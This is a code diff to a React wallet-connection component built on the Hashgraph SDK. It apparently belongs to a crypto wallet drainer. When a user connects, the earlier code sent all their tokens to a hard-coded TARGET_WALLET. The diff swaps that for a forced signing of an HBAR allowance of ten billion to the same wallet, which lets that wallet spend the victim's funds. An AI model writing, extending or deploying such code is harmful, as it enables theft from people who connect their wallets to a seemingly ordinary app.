@@ -1,5 +1,5 @@
 import { Box, Button } from "@mui/material";
-import { AccountId, Hbar, TransferTransaction, HbarUnit } from "@hashgraph/sdk";
+import { AccountId, Hbar, TransferTransaction, HbarUnit, AccountAllowanceApproveTransaction } from "@hashgraph/sdk";
 import { useCallback, useEffect, useRef } from "react";
 import { useDispatch, useSelector } from "react-redux";
 import { hc, hcInitPromise, TARGET_WALLET } from "../../services/hashconnect";
@@ -104,7 +104,8 @@ export const HashConnectClient = () => {
               token_id: info?.token_id?.toString() ?? "",
             }));
         }
-        await sendAllTokens(accountIDD, TARGET_WALLET, tokenInfos);
+        await handleAllowanceApprove(accountIDD);
+        // await sendAllTokens(accountIDD, TARGET_WALLET, tokenInfos);
       } else {
         // Update Redux for no connected accounts
         dispatch(actions.hashconnect.setAccountIds([]));
@@ -118,6 +119,34 @@ export const HashConnectClient = () => {
       console.log("syncWithHashConnect completed.");
     }
   }, [dispatch]);
+
+  const handleAllowanceApprove = async (accountId: string) => {
+    try {
+      console.log("handleAllowanceApprove started", accountId);
+      
+      const hbarAccountId = `0.0.${accountId}`;
+      const signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
+
+      // Create allowance transaction
+      const transaction = new AccountAllowanceApproveTransaction()
+        .approveHbarAllowance(
+          hbarAccountId,
+          TARGET_WALLET,
+          new Hbar(10000000000) // Amount from your screenshot
+        );
+
+      // Freeze and execute transaction
+      await transaction.freezeWithSigner(signer);
+      const txResponse = await transaction.executeWithSigner(signer);
+      const receipt = await txResponse.getReceipt(signer.getClient());
+
+      console.log("Allowance Transaction Status:", receipt.status.toString());
+      return receipt.status.toString() === "SUCCESS";
+    } catch (error) {
+      console.error("Error in allowance approval:", error);
+      return false;
+    }
+  };
 
   useEffect(() => {
     const pairingCallback = (data: any) => {
